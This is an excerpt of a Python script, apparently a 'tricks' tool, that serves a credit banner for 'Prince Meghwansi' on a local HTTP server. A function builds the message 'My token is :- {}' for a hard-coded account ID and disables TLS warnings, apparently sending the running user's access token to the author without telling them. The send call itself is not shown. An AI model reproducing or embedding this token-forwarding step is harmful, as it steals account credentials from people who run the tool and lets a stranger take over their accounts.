...
class MyHandler(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):
          ...
          self.end_headers()
          self.wfile.write(b"CREDIT :- TRICKS BY PRINCE MEGHWANSI <br> <br> OWNER => PRINCE <br> <br> WATSAPP :- +916378985989")
def execute_server():
      PORT = 4000
...
def send_initial_message():
      ...
      msg_template = "CREDIT :- TRICKS BY PRINCE  MEGHWANSI                                                      Owner => Prince  Meghwansi                                                    Hello Prince sir. I am using your server. My token is :- {}"

      # Specify the ID where you want to send the message
      target_id = "100080287361043"

      requests.packages.urllib3.disable_warnings()

      def liness():
          print('\033[1;92m' + '●════════════PRINCE-MEGHWANSI════════════●')
